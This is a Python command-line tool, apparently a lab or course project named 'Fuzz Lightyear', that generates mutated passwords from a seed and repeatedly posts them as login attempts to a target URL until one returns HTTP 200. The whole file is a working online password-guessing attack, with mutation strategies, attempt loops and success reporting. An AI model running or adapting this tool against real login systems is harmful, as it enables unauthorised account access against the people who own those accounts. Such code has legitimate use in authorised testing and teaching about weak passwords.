import argparse
import re
import sys
import random
import string
import time
import requests
import json

# password regex: ^[A-Za-z0-9!?]{6,11}$
REGEX = "^[A-Za-z0-9!?]{6,11}$"

""" Function manages the mutation loop and login attempts to the target URL"""
"""Input Flags: 0 - Simple (only uses seed for mutations)
                1 - Iterative (Mutates based off past mutations)
                2 - Complex (Mutates multiple times before submission)"""
def fuzz(seed, regex, max_attempts, max_time, url, username, fuzz_type):
    start_time = time.time()
    curr_attempt = 0
    past_mutation = seed
    while(True):
        output = mutation_handler(seed, past_mutation, regex, fuzz_type, curr_attempt)
        generated_pass = output[0]
        past_mutation = output[1]
        curr_attempt += 1
        # Submit Attempt
        payload = {"username": username, "password": generated_pass}
        r = requests.post(url, data=json.dumps(payload), headers={"Content-Type": "application/json"})
        if(r.status_code == 404):
            print("Error 404: URL not found")
            exit(1)
        print(r.status_code)
        if r.status_code == 200:
            print("{}{}".format("Success! Password is: ", generated_pass))
            exit(0)

        print("{}{}".format("Attempt: ", curr_attempt))
        # If attempt fails, check if time runs out or if max attempts reached
        if(max_time != 0 and time.time()-start_time > max_time):
            print("Max Time Reached. Aborting Process")
            exit(1)
        if(max_attempts != 0 and curr_attempt > max_attempts):
            print("Max Attempts Reached. Aborting Process")
            exit(1)



"""Mutation handler function

    This is called first from the fuzz() function. Depending on the fuzz type chosen, it will mutate differently"""
def mutation_handler(seed, past_mutation, regex, type, curr_attempt):
    if type == 0: # Simple mutation chosen, seed used in all runs
        generated_pass = mutate(seed, regex)
    if type == 1: # Iterative mutation chosen, past_mutation used as seed for next run. Resets after every 25 attempts
        if curr_attempt % 25 == 0:
            past_mutation = seed
        generated_pass = mutate(past_mutation, regex)
        past_mutation = generated_pass
    if type == 2: # Complex mutation chosen, 2 mutates per run. Resets after every 10 attempts
        if curr_attempt % 10 == 0:
            past_mutation = seed
        generated_pass = mutate(past_mutation, regex)
        generated_pass = mutate(generated_pass, regex)
        past_mutation = generated_pass
    
    return [generated_pass, past_mutation]

def mutate(seed, regex):
    while True: # Loop until a valid candidate is found
        pwd = list(seed) # Convert seed to a list of characters for mutation

        mutation_type = random.choice(['sub', 'insert', 'delete', 'swap', 'case']) # Randomly select a mutation type

        if mutation_type == 'sub': # Chooses a random character and substitutes it with a random character of the same type
            idx = random.randrange(len(pwd))
            old = pwd[idx]
            if old.islower():
                pwd[idx] = random.choice(string.ascii_lowercase)
            elif old.isupper():
                pwd[idx] = random.choice(string.ascii_uppercase)
            elif old.isdigit():
                pwd[idx] = random.choice(string.digits)
            else:
                pwd[idx] = random.choice(string.punctuation)

        elif mutation_type == 'insert': # Inserts a random character at a random position
            char = random.choice(string.ascii_letters + string.digits + "!?")
            idx = random.randrange(len(pwd) + 1)
            pwd.insert(idx, char)

        elif mutation_type == 'delete' and len(pwd) > 1: # Deletes a random character from the password
            idx = random.randrange(len(pwd))
            del pwd[idx]

        elif mutation_type == 'swap' and len(pwd) >= 2: # Swaps two adjacent characters in the password
            i = random.randrange(len(pwd) - 1)
            pwd[i], pwd[i+1] = pwd[i+1], pwd[i]

        elif mutation_type == 'case': # Swaps the case of a random character in the password
            idx = random.randrange(len(pwd))
            pwd[idx] = pwd[idx].swapcase()

        candidate = ''.join(pwd) # Convert list back to string

        if re.fullmatch(regex, candidate): # Returns the candidate if it matches the regex pattern
            return candidate

""" Function to check whether a string is a valid regex pattern """
def valid_regex(value):
    try:
        re.compile(value)
        return value
    except re.error:
        raise argparse.ArgumentTypeError(f"Invalid regex pattern: {value}")

""" Function to check whether a string is a valid URL """
def valid_url(value):
    if not value.startswith(('http://', 'https://')):
        raise argparse.ArgumentTypeError("URL must start with http:// or https://")
    return value

""" Function to parse command line arguments """
def parse_args():
    parser = argparse.ArgumentParser(
        description=" Fuzz Lightyear: To Login and Beyond!"
    )

    parser.add_argument('--url', required=True, type=valid_url,
                        help="Target login endpoint (e.g. http://localhost:5000/login)")
    parser.add_argument('--username', required=True,
                        help="Username to test")
    parser.add_argument('--seed', required=True, type=str, default="Password123!",
                        help="Seed password to mutate")
    parser.add_argument('--regex', type=valid_regex,
                        help="Regex pattern password must satisfy")
    parser.add_argument('--max-time', type=int, default=60,
                        help="Maximum execution time in seconds")
    parser.add_argument('--max-attempts', type=int, default=500,
                        help="Maximum number of password attempts")
    parser.add_argument('--fuzz-type', type=int, default=0,
                        help="Fuzzing Type (0 - Simple, 1 - Iterative, 2 - Complex)")

    args = parser.parse_args()

    # Custom post-checks
    if args.max_time <= 0:
        parser.error("max-time must be a positive integer")
    if args.max_attempts < 0:
        parser.error("max-attempts must be a positive integer")
    if args.fuzz_type < 0 or args.fuzz_type > 2:
        parser.error("Fuzz Type must be 0, 1, or 2")
    if not re.fullmatch(REGEX, args.seed):
        parser.error("Seed must full match regex: ^[A-Za-z0-9!?]{6,11}$")
    return args

""" Main function to run the script """
def main():
    args = parse_args()
    # Placeholder for the main logic of the script
    print("""
    Welcome to...
v--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------v
|  ______     __  __       ______      ______                  __           ________      _______      ___   ___      _________   __  __     ______       ________       ______        |
| /_____/\   /_/\/_/\     /_____/\    /_____/\                /_/\         /_______/\    /______/\    /__/\ /__/\    /________/\ /_/\/_/\   /_____/\     /_______/\     /_____/\       |
| \::::_\/_  \:\ \:\ \    \:::__\/    \:::__\/                \:\ \        \__.::._\/    \::::__\/__  \::\ \\  \ \   \__.::.__\/ \ \ \ \ \  \::::_\/_    \::: _  \ \    \:::_ \ \       |
|  \:\/___/\  \:\ \:\ \      /: /        /: /                  \:\ \          \::\ \      \:\ /____/\  \::\/_\ .\ \     \::\ \    \:\_\ \ \  \:\/___/\    \::(_)  \ \    \:(_) ) )_    |
|   \:::._\/   \:\ \:\ \    /::/___     /::/___                 \:\ \____     _\::\ \__    \:\\_  _\/   \:: ___::\ \     \::\ \    \::::_\/   \::___\/_    \:: __  \ \    \: __ `\ \    |
|    \:\ \      \:\_\:\ \  /_:/____/\  /_:/____/\                \:\/___/\   /__\::\__/\    \:\_\ \ \    \: \ \\::\ \     \::\ \     \::\ \    \:\____/\    \:.\ \  \ \    \ \ `\ \ \   |
|     \_\/       \_____\/  \_______\/  \_______\/                 \_____\/   \________\/     \_____\/     \__\/ \::\/      \__\/      \__\/     \_____\/     \__\/\__\/     \_\/ \_\/  |
|                                                                                                                                                                                      |
^--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------^                                                                                                                                                                                      

    Current Settings: 
""")
    print(f"URL: {args.url}")
    print(f"Username: {args.username}")
    print(f"Seed Password: {args.seed}")
    print("{}{}".format("Regex Pattern: ", REGEX))
    print(f"Max Time: {args.max_time} seconds")
    print(f"Max Attempts: {args.max_attempts}")
    print(f"Fuzz Type: {args.fuzz_type}")
    input("\n\nPress enter when you are ready to begin fuzzing!")

    fuzz(args.seed, REGEX, args.max_attempts, args.max_time, args.url, args.username, args.fuzz_type)

if __name__ == "__main__":
    main()